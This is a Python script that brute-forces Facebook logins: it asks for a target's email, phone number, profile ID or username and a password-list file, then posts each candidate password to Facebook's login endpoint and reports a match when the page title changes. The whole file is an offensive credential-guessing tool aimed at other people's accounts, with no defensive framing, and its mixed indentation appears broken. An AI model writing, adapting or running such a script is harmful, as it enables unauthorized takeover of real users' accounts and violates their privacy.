import sys
import http.cookiejar, urllib.request, urllib
from bs4 import BeautifulSoup
import time

email = str(input("# Enter |Email| |Phone number| |Profile ID number| |Username| : "))
passwordlist = str(input("Enter the name of the password list file : "))


def attack(password):
	# Storing cookies in cj variable
	sys.stdout.write("\r[*] trying %s.. " % password)
	cj = http.cookiejar.CookieJar()

	# Defining a handler for later http operations with cookies(cj).
	op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

	url = ('https://www.facebook.com/')
	resp = op.open(url)

	# Logging in
	url = ('https://www.facebook.com/login.php?login_attempt=1&lwv=110')
	val = {'email' : email, 'pass' : password} #aqui tu ru y contraseña
	data = urllib.parse.urlencode(val)
	asciidata = data.encode('ascii')
	resp = op.open(url, asciidata)


	soup = BeautifulSoup(resp.read(), "html.parser")
	result=str(soup.findAll('title'))
	#print(result)
	
	if ('Iniciar sesión en Facebook | Facebook'not in result and 'Facebook - Entra o regístrate' not in result):
		print ("\n\n\n [*] Password found .. !!")
		print ("\n [*] Password : %s\n" % (password))
		sys.exit(1)
	
	"""
	url = ('https://www.facebook.com/')
	resp = op.open(url)
	#print (resp.read())

	soup = BeautifulSoup(resp.read(), "html.parser")
	a=str(soup.findAll('title'))
	print(a)
	"""
def search():
    global password
    for password in passwords:
        attack(password.replace("\n",""))
	print("\n[*]Search ending pass not fount .. !!")

def cargar():
	global passwords
	try:
		list = open(passwordlist, "r")
		passwords = list.readlines()
		k = 0
		while k < len(passwords):
			passwords[k] = passwords[k].strip()
			k += 1
	except IOError:
		print ("\n [*] Error: check your password list path \n")
		sys.exit(1)
	try:
		#print GHT
		print (" [*] Account to crack : %s" % (email))
		print (" [*] Loaded :" , len(passwords), "passwords")
		print (" [*] Cracking, please wait ...")
	except KeyboardInterrupt:
		print ("\n [*] Exiting program ..\n")
		sys.exit(1)
	try:
		search()
		#attack(password)
	except KeyboardInterrupt:
		print ("\n [*] Exiting program ..\n")
		sys.exit(1)
		

if __name__ == '__main__':
    cargar()